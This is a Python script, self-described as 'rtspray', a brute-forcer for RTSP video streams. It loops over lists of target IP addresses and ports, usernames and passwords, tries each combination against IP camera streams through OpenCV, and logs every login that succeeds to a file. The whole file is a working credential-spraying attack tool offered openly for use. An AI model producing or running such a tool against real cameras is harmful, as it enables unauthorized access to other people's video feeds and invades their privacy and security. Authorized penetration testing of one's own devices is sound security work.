import argparse
import os
import cv2

def read_file(file_path):
    """creating list from targets file"""
    with open(file_path, 'r') as file:
        return [line.strip() for line in file if line.strip()]

def check_rtsp_auth(ip, port, username, password):
    """auth check function"""
    rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/"
    cap = cv2.VideoCapture(rtsp_url)


    for _ in range(5):
        if not cap.isOpened():
            return False
        ret, _ = cap.read()
        if ret:
            cap.release()
            return True

    cap.release()
    return False

def main():
    parser = argparse.ArgumentParser(description='rtspray.py - python rtsp brute-forcer by h4ckr4v3n')
    parser.add_argument('-l', '--list', help='File containing target addresses. Format <ip> <port>', type=str)
    parser.add_argument('-t', '--target', help='Target address. Format <ip>:<port>', type=str)
    parser.add_argument('-u', '--username', help='Username or user_file', type=str)
    parser.add_argument('-p', '--password', help='Password or pass_file', type=str)

    args = parser.parse_args()

    if args.list:
        ip_ports = read_file(args.list)
    elif args.target:
        ip_ports = [args.target]
    else:
        print("There is no target specified.")
        return


    usernames = read_file(args.username) if args.username and os.path.isfile(args.username) else [args.username]
    passwords = read_file(args.password) if args.password and os.path.isfile(args.password) else [args.password]


    with open('rtsp_auth_result.txt', 'w') as result_file:
        for ip_port in ip_ports:
            ip, port = ip_port.split(':') if ':' in ip_port else (ip_port.split()[0], 554)
            for username in usernames:
                for password in passwords:
                    if check_rtsp_auth(ip, port, username, password):
                        result_file.write(f"{ip}:{port} - {username}:{password}\n")
                        print(f"Successful authorization: {ip}:{port} - {username}:{password}")

if __name__ == '__main__':
    main()

